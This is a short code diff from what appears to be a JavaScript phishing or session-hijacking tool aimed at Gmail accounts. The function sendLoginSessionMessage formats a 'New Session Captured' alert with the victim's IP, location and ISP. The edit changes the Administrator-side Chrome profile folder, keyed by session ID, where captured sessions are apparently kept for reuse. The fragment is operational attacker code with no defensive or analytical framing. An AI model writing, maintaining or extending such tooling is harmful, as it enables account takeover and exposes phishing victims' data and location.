@@ -809,7 +809,7 @@ async function sendLoginSessionMessage(sessionId) {
       ? `IP: ${ipInfo.ip}\nLocation: ${ipInfo.location}\nISP: ${ipInfo.isp}`
       : `IP: unknown`;
 
-    const profileCmd = `"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" --user-data-dir="C:\\Users\\Administrator\\Pictures\\gmail\\chrome-profiles\\${sessionId}"`;
+    const profileCmd = `"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" --user-data-dir="C:\\Users\\Administrator\\Desktop\\gmail\\chrome-profiles\\${sessionId}"`;
 
     const sessionMessage =
       `<b>New Session Captured</b>\n\n` +
